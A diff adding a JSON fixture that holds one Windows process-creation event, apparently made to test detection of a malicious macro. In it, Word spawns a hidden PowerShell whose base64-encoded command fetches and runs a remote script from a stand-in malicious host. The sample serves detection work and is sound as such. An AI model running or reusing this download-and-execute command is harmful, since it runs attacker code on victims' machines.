@@ -1,0 +1,14 @@
+{
+  "EventId": 4688,
+  "Channel": "Security",
+  "Computer": "FINANCE-LAPTOP.corp.internal",
+  "TimeCreated": "2024-03-21T09:15:32.451290Z",
+  "SubjectUserName": "jsmith",
+  "SubjectUserSid": "S-1-5-21-9876543210-9876543210-1045",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9tYWxpY2lvdXMtZmlsZXMuY29tL3BheWxvYWQucHMxJyk=",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+  "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Invoice_Q1_2024.docm\"",
+  "ProcessId": 7914,
+  "ParentProcessId": 4120
+}
